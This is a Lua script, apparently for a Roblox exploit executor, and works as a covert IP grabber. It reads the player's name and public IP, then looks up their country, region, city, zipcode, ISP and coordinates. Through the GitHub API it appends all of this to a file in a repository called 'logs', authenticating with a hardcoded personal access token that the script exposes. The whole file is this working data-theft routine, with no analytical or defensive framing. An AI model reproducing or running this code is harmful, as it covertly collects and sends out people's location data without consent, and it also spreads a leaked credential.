-- --- GITHUB VARIABLES ---
local GITHUB_USERNAME = "STORAGERKIR"
local REPO = "logs"
local FILE_PATH = "data.txt"
local TOKEN = "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"  -- **Ensure you regenerate this token if exposed!**

local name = game:GetService("Players").LocalPlayer.Name
local getIPResponse = request({
    Url = "https://api.ipify.org/?format=json",
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = http.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer)
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}

local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)

-- GitHub API URL to fetch the current file content and update it
local apiUrl = string.format("https://api.github.com/repos/%s/%s/contents/%s", GITHUB_USERNAME, REPO, FILE_PATH)

-- Step 1: Fetch the current content of the file (to preserve previous content)
local currentFileContent = ""

local getCurrentFileResponse = request({
    Url = apiUrl,
    Headers = {
        Authorization = "token " .. TOKEN,
    },
})

if getCurrentFileResponse.StatusCode == 200 then
    -- If the file exists, get its content (base64 encoded)
    local fileData = game:GetService("HttpService"):JSONDecode(getCurrentFileResponse.Body)
    currentFileContent = game:GetService("HttpService"):Base64Decode(fileData.content) or ""
    print("File content retrieved successfully.")  -- Debug log
else
    -- If file doesn't exist, inform user
    print("Error fetching file. Status code: " .. getCurrentFileResponse.StatusCode)
end

-- Step 2: Combine the old and new data to update the file
local newFileContent = game:GetService("HttpService"):Base64Encode(currentFileContent .. "\n" .. dataMessage)

-- Step 3: Update the file on GitHub
local response = request({
    Url = apiUrl,
    Method = "PUT",
    Headers = {
        Authorization = "token " .. TOKEN,
        ["Content-Type"] = "application/json",
    },
    Body = game:GetService("HttpService"):JSONEncode({
        message = "Updating player data",
        content = newFileContent,
        branch = "main",  -- Make sure you're using the correct branch
    }),
})

-- Log the response status for debugging
print("Response Status Code: " .. response.StatusCode)
if response.StatusCode == 201 then
    print("Data successfully updated in the file.")
else
    print("Failed to update file. Status: " .. response.StatusCode)
end
